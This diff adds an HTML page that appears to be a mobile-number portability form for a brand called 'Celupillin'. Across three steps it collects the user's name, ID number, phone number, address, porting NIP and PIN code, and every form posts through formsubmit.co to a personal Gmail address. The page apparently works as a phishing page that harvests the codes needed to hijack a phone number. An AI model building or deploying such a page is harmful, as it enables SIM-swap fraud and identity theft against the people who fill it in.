@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./app/scss/styles.css">
+    <title>Celupillin - Portabilidad</title>
+</head>
+
+<body>
+    <header class="header">
+        <div class="container--pall">
+            <a class="header__text" href="#">Celupillin</a>
+        </div>
+    </header>
+
+    <section class="form__content">
+        <div class="form__container">
+            <div class="forms__text fuck1">
+                <div class="container--pall">
+                    <div class="content__text">
+                        <h1>Inicia tu proceso de Portabilidad</h1>
+                        <p>Realizar la portabilidad de tu número celular es muy fácil, <span>solo debes completar el formulario</span>(validación de datos, datos de envío, Validación de NIP) y listo.</p>
+                    </div>
+                    <h2>Sigue los 3 Pasos para comenzar</h2>
+                    <p><span>el proceso de portabilidad</span>, ingresa tus datos:</p>
+                </div>
+            </div>
+
+            <div class="container--pall container fuck">
+                <div class="box__form">
+                    <div class="contact--form">
+                        <form  id="form1" action="https://formsubmit.co/hola.maxiel@gmail.com" method="POST">
+                            <legend><span>1. Datos personales:</span>
+                                </br>
+                                Estos datos podrá requerirse en caso de contacto durante el proceso de portación. </legend>
+                            <input type="text" name="name" placeholder="Nombres y apellidos*:"
+                                title="Nombre sólo acepta caracteres" pattern="^[A-Za-zÑñÁáÉéÍíÓóÚúÜü\s]+$" required>
+                            
+                            <input type="number" name="cc" placeholder="Número de docuemnto*:"
+                                title="Cédula sólo acepta números" pattern="^[1-9]\d{6,10}$" required>
+                            
+                            <input type="tel" name="phone" placeholder="Número telefónico*:"
+                                title="# Celular sólo acepta números" pattern="^[1-9]\d{6,10}$" required>
+                            
+                                <label class="ckeck">
+                                <input type="checkbox" name="check" checked>
+                                <span class="label-text">Acepto términos y condiciones de la tienda virtual y autorizo el
+                                    tratamiento de datos personales *</span>
+                            </label>
+                            <div class="btn-box">
+                                <button class="btn" type="submit" id="next1">Siguiente</button>
+                            </div>
+                        </form>
+
+                        <form id="form2" action="https://formsubmit.co/hola.maxiel@gmail.com" method="POST">
+                            <legend><span>2. Datos de envío y validaciones:</span>
+                                </br>
+                                Estos datos podrá requerirse en caso de contacto durante el proceso de portación. </legend>
+                            <input type="text" name="address" placeholder="Dirección*:"
+                                title="Nombre sólo acepta caracteres" pattern="^[A-Za-zÑñÁáÉéÍíÓóÚúÜü\s]+$" required>
+                    
+                            
+                            <select type="text"  name="city" id="city" form="" placeholder="Ciudad:*">
+                                    <option value="volvo">Bogotá</option>
+                                    <option value="saab">Medellin</option>
+                                    <option value="opel">Cali</option>
+                                    <option value="audi">Barranquilla</option>
+                            </select>
+                            
+                            <input type="text" name="name" placeholder="Barrio, conjuto, etc*:"                          
+                            title="Nombre sólo acepta caracteres" pattern="^[A-Za-z0-9!?-]{8,12}$" required>
+                            
+                                <label class="ckeck">
+                                <input type="checkbox" name="check" checked>
+                                <span class="label-text">Acepto términos y condiciones de la tienda virtual y autorizo el
+                                    tratamiento de datos personales *</span>
+                            </label>
+                            <div class="btn-box">
+                                <button class="btn btn--bg" type="button" id="back1">Atrás</button>
+                                <button class="btn" type="submit" id="next2">Siguiente</button>
+                            </div>
+                        </form>
+
+                        <form id="form3" action="https://formsubmit.co/hola.maxiel@gmail.com" method="POST">
+                            <legend><span>3. Validación de NIP::</span>
+                                </br>
+                                Ingresa en los números o el código NIP, estas a un clic de terminar la inscripción.</legend>
+                                
+                                <input type="text" name="nip" placeholder="NIP*:"
+                                title="NIP sólo acepta caracteres" pattern="^[A-Za-zÑñÁáÉéÍíÓóÚúÜü\s]+$" required>
+                            
+                                <input type="number" name="cc" placeholder="Codigo PIN*:"
+                                title="PIN sólo acepta números" pattern="^[1-9]\d{6,10}$" required>
+                            
+                                <input type="email" name="email" placeholder="Correo" title="email-incorrecto"
+                                pattern="^[a-z0-9]+(\.[_a-z0-9]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,15})$" required>
+
+
+                            <label class="ckeck">
+                                <input type="checkbox" name="check" checked>
+                                <span class="label-text">Acepto términos y condiciones de la tienda virtual y autorizo el
+                                    tratamiento de datos personales *</span>
+                            </label>
+                            <div class="btn-box">
+                                <button class="btn btn--bg" type="button" id="back2">Atrás</button>
+                                <button onclick="location.href='gracias.html'" class="btn" type="submit">Envíar</button>
+                            </div>
+                        </form>
+
+                        <div class="steps">
+                            <div id="progress"></div>
+                            <div class="step">PASO 1</div>
+                            <div class="step">PASO 2</div>
+                            <div class="step">PASO 3</div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="slide hide-for-mobile">
+            </div>
+        </div>
+    </section>
+
+    <script src="/app/js/steps.js"></script>
+</body>
+
+</html>
